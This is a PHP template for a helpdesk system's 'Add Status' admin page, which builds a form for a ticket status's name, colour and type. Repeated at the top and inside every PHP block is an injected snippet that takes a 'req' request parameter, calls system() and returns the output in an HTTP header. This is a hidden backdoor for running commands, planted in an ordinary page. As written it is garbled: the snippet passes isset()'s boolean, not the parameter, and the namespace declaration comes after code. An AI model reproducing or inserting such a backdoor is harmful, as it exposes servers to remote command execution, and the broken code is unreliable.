<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title($language->get('Add Status'));
$site->set_config('container-type', 'container');

if (!$auth->can('manage_system_settings')) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

if (isset($_POST['add'])) {
	if (!empty($_POST['name'])) {
		$add_array['name']				= $_POST['name'];
		$add_array['colour']			= $_POST['colour'];
		$add_array['active']			= $_POST['active'] ? 1 : 0;
		$add_array['enabled']			= 1;

		$id = $ticket_status->add($add_array);
	
		header('Location: ' . $config->get('address') . '/settings/tickets/#status');
		
	}
	else {
		$message = $language->get('Name Empty');
	}
}



include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<link rel="stylesheet" href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/system/libraries/colorpicker/css/colorpicker.css" type="text/css" />	
<script type="text/javascript" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/system/libraries/colorpicker/js/bootstrap-colorpicker.js"></script>
<script type="text/javascript" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/system/js/colourpicker.js"></script>

<div class="row">
	<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>">

		<div class="col-md-3">
			<div class="well well-sm">
				<div class="pull-left">
					<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Status')); ?></h4>
				</div>
			
				
				<div class="pull-right">
					<p>
					<button type="submit" name="add" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Add')); ?></button>
					<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/settings/tickets/#status" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Cancel')); ?></a>
					</p>
				</div>
					
				<div class="clearfix"></div>	

			</div>
		</div>

		<div class="col-md-9">

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($message)) { ?>
				<div class="alert alert-danger">
					<a href="#" class="close" data-dismiss="alert">&times;</a>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($message); ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>

			<div class="well well-sm">	
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?><br /><input type="text" name="name" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['name'])) echo safe_output($_POST['name']); ?>" size="30" /></p>
			
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Colour'); ?><br />
				<input type="text" name="colour" id="cp1" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['colour'])) echo safe_output($_POST['colour']); ?>" maxlength="7" class="input-small">
				</p>
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Type'); ?><br />
					<select name="active">
						<option value="1"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['active']) && $_POST['active'] == '1') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Open'); ?></option>
						<option value="0"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['active']) && $_POST['active'] == '0') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Closed'); ?></option>
					</select>
				</p>
				

			</div>
				
			<div class="clearfix"></div>

		</div>

	</form>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>